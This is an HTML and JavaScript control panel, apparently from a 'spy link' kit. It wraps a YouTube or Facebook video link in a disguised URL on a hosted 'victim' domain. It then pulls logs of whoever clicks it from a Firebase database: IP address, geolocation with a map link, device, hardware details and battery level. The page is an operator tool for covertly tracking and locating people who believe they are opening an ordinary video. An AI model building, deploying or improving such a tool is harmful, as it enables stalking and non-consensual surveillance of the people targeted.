<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MA LEGEND | SUPREME ADMIN</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Poppins:wght@400;600&display=swap');
        body { background: #e0e5ec; font-family: 'Poppins', sans-serif; color: #44476a; display: flex; justify-content: center; padding: 20px; }
        .container { width: 100%; max-width: 500px; }
        .neu-card { background: #e0e5ec; padding: 25px; border-radius: 30px; box-shadow: 9px 9px 16px #bcbfc5, -9px -9px 16px #ffffff; margin-bottom: 25px; }
        h2 { font-family: 'Orbitron'; color: #00a884; text-align: center; letter-spacing: 2px; font-size: 1.2rem; }
        label { font-size: 0.7rem; font-weight: bold; margin-left: 10px; color: #777; }
        input { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: inset 6px 6px 12px #cbcbe1, inset -6px -6px 12px #ffffff; outline: none; margin: 10px 0; box-sizing: border-box; color: #444; }
        .btn { width: 100%; padding: 15px; border: none; border-radius: 15px; background: #e0e5ec; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; color: #00a884; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; margin-top: 10px; transition: 0.3s; }
        .btn:active { box-shadow: inset 4px 4px 8px #bcbfc5, inset -4px -4px 8px #ffffff; }
        .log-card { background: #e0e5ec; padding: 20px; border-radius: 20px; box-shadow: 6px 6px 12px #bcbfc5, -6px -6px 12px #ffffff; margin-top: 20px; font-size: 0.75rem; border-left: 6px solid #00a884; animation: fadeIn 0.5s ease; }
        .row { display: flex; justify-content: space-between; border-bottom: 1px solid rgba(0,0,0,0.05); padding: 5px 0; }
        .row b { color: #00a884; }
        #copy-msg { font-size: 0.6rem; color: #00a884; text-align: center; display: none; margin-top: 5px; font-weight: bold; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="neu-card">
            <h2>MA LEGEND SPY</h2>
            <p style="text-align:center; font-size:10px; opacity:0.6;">PRIVATE DASHBOARD</p>
            
            <label>YOUR SECRET KEY (Privacy ID):</label>
            <input type="text" id="userKey" placeholder="Aisa naam rakhein jo koi guess na kar sakay">
            
            <label>TARGET VIDEO LINK:</label>
            <input type="text" id="targetUrl" placeholder="Paste YouTube/FB Link">
            
            <button class="btn" onclick="generate()">GENERATE SPY LINK</button>
            
            <div id="result" style="display:none; margin-top:20px;">
                <input type="text" id="finalLink" readonly>
                <button class="btn" style="background:#00a884; color:white;" onclick="copy()">COPY LINK</button>
                <p id="copy-msg">LINK COPIED TO CLIPBOARD!</p>
            </div>
        </div>

        <div id="logsContainer">
            <button class="btn" onclick="fetchLogs()" style="color: #44476a;">REFRESH PRIVATE LOGS</button>
            <div id="displayArea"></div>
        </div>
    </div>

    <script>
        const DB_URL = "https://location-5d435-default-rtdb.firebaseio.com/data/";
        const VICTIM_DOMAIN = "https://video-obtg.vercel.app/";

        function generate() {
            const key = document.getElementById('userKey').value.trim();
            const url = document.getElementById('targetUrl').value.trim();
            if(!key || !url) return alert("Pura fill karein!");
            const encoded = btoa(key + "|" + url);
            document.getElementById('finalLink').value = VICTIM_DOMAIN + "?id=" + encoded;
            document.getElementById('result').style.display = 'block';
        }

        function copy() {
            const link = document.getElementById('finalLink');
            link.select();
            document.execCommand("copy");
            document.getElementById('copy-msg').style.display = 'block';
            setTimeout(() => { document.getElementById('copy-msg').style.display = 'none'; }, 2000);
        }

        async function fetchLogs() {
            const key = document.getElementById('userKey').value.trim();
            if(!key) return alert("Pehle apni Secret Key daalein!");
            
            try {
                const res = await fetch(`${DB_URL}${key}.json`);
                const data = await res.json();
                const area = document.getElementById('displayArea');
                area.innerHTML = "";
                
                if(!data) { area.innerHTML = "<p style='text-align:center;'>No logs found for this Key.</p>"; return; }

                Object.keys(data).reverse().forEach(id => {
                    const l = data[id];
                    area.innerHTML += `
                        <div class="log-card">
                            <div class="row"><b>üïí Time:</b> <span>${l.time}</span></div>
                            <div class="row"><b>üåê IP:</b> <span>${l.ip}</span></div>
                            <div class="row"><b>üìç Location:</b> <span>${l.loc}</span></div>
                            <div class="row"><b>üì± Device:</b> <span>${l.dev}</span></div>
                            <div class="row"><b>üß† Hardware:</b> <span>${l.cpu} Core | ${l.ram}GB RAM</span></div>
                            <div class="row"><b>üîã Battery:</b> <span>${l.batt}</span></div>
                            <a href="${l.map}" target="_blank" style="display:block; text-align:center; background:#00a884; color:#fff; padding:10px; border-radius:15px; text-decoration:none; margin-top:10px; font-weight:bold;">VIEW ON MAP</a>
                        </div>`;
                });
            } catch(e) { alert("Database Error!"); }
        }
    </script>
</body>
</html>
